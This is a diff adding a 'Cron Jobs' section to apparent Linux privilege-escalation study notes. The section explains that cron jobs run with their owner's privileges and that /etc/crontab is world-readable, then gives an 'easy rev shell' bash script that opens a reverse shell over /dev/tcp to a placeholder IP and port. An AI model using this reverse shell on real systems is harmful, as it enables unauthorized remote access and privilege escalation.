@@ -48,3 +48,12 @@ Search on [GTFOBins+capabilities](https://gtfobins.github.io/#+capabilities) <br
 
 ## Cron Jobs
 
+Cron jobs are used to run scripts or binaries at specific times. By default, they run with the privilege of their owners and not the current user. While properly configured cron jobs are not inherently vulnerable, they can provide a privilege escalation vector under some conditions. <br>
+
+Any user can read the file keeping system-wide cron jobs under `/etc/crontab`
+
+easy rev shell<br>
+<pre>#!/bin/bash 
+
+bash -i >& /dev/tcp/IP/PORT 0>&1</pre>
+
